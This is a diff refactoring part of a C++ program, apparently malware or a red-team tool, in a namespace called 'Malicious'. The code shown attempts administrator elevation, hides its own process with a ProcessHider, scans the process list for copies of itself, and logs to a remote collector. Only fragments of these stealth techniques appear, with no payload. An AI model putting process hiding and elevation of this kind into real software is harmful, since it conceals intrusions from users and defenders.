@@ -4,9 +4,7 @@
 using namespace Malicious;
 
 #include <system/Uac.hpp>
-#include <system/ProcessManager.hpp>
-#include <system/ThisProcess.hpp>
-using namespace System;
+#include <system/Process.hpp>
 
 #include <common/Log.hpp>
 
@@ -21,7 +19,7 @@ int main(int argc, char * argv[])
 	    LOG.addObserver(new Common::LogToNetwork(AUDIT_COLLECTOR_IP, AUDIT_COLLECTOR_PORT));
 		LOG.addObserver(new Common::LogToConsole());
 
-        ThisProcess thisProcess;
+        System::Process::This thisProcess;
         if(!System::isAdministrator())
 	    {
             LOG << "Trying to run as administrator";
@@ -33,10 +31,10 @@ int main(int argc, char * argv[])
         ProcessHider hider;
 		hider.hide(thisProcess.getProgramName());
 
-		ProcessesMap pm;
-		GetProcessList(pm);
+		System::Process::Map pm;
+		System::Process::GetProcessList(pm);
 
-		for(ProcessesMap::iterator i = pm.begin(); i != pm.end(); i++)
+		for(System::Process::Map::iterator i = pm.begin(); i != pm.end(); i++)
 		{
 			if(i->second ==  thisProcess.getProgramName())
 			{
